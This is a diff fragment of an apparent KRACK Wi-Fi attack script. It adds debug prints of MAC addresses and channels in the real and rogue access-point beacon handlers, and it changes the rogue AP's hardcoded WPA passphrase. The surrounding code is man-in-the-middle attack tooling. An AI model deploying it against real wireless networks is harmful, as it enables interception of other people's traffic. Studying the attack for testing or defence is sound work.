@@ -95,7 +95,6 @@ class MitmSocket(L2Socket):
 		p = L2Socket.recv(self, x)
 		if p == None: 
 			return None
-		print(p.addr1, p.addr2)
 		if p.getlayer(Dot11) == None:
 			return None
 		# if self.pcap: self.pcap.write(p)
@@ -361,7 +360,7 @@ wmm_enabled={wmmenabled}
 wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
-wpa_passphrase=password"""
+wpa_passphrase=hsng@root"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
 		return TEMPLATE.format(
@@ -692,6 +691,8 @@ class KRAckAttack():
 		# 2. Handle frames sent BY the real AP
 		elif p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
+			print(p.addr1, p.addr2, end='  channel: ')
+			print(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)))
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
 				self.last_real_beacon = time.time()
 
@@ -742,6 +743,8 @@ class KRAckAttack():
 		if p == None: return
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
+			print(p.addr1, p.addr2, end='  channel: ')
+			print(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)))
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
